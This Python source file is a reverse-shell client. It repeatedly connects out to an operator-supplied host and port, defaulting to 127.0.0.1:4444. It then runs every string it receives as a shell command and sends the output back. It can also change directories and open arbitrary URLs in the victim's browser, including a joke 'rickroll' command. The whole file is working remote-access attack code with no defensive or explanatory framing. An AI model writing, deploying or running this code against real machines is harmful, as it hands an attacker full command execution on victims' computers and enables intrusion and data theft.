import os
import sys
import socket
import subprocess as sp
import webbrowser as browser



def handle(s):
    quit_ = "dbd73c2b545209688ed794c0d5413d5a"
    not_output = '<PRINT NOTHING>'.encode()

    while True:
        try:
            try:
                data = s.recv(4096)
            except ConnectionResetError:
                print("Connection lost.")
                sys.exit()

            print(data.decode())
            if not data: break

            data2 = data.decode("utf-8")

            if data2.startswith("cd") and data2 != "cd %USERPROFILE%":
                path = data2[3:]
                os.chdir(path)

                s.send(not_output)

            elif data2 == "cd %USERPROFILE%":
                path = os.environ.get("USERPROFILE")
                os.chdir(path)

            elif data2 == quit_:
                s.shutdown(2)
                s.close(3)
                sys.exit(1)

            elif data2.startswith("browse"):
                try:
                    url = data2.replace("browse ", "")
                    s.send(f"Opeining <{url}>...".encode())
                    browser.open(url)
                    s.send("Done!".encode())
                except:
                    s.send(f"Error opening:\n{url}")

            elif data2 == "rickroll":
                try:
                    browser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
                    s.send("Rickrolled".encode())
                except:
                    s.send("Rickrolling gone wrong".encode())

            elif data2 == "getcwd" or data2 == "pwd":
                s.sendall(os.getcwd().replace("\\\\", "\\").encode())

            else:
                spe = sp.run(data.decode("utf-8"), shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
                output_spe = spe.stdout + spe.stderr
                if output_spe == b'':
                    s.send('<PRINT NOTHING>'.encode())
                else:
                    s.sendall(output_spe)
    
        except Exception as e:
            try:
                s.send(str(e).encode())
            except ConnectionResetError:
                print("Connection lost.")
                sys.exit()


def connect(host, port):
    s = socket.socket()
    refused = 0
    while True:
        try:
            s.connect((host, int(port)))
        except ConnectionRefusedError:
            refused += 1
            print(f"Connection refused ( {refused} )", end="\r")
        except OSError as e:
            if e.args[0] == 10056:
                continue
        else:
            print("Connection established!!")
            handle(s)

if __name__ == "__main__":
    for i in sys.argv:
        print(i)
    print()
    try:
        host = sys.argv[1]
        port = sys.argv[2]
    except IndexError:
        host = "127.0.0.1"
        port = 4444
    connect(host, port)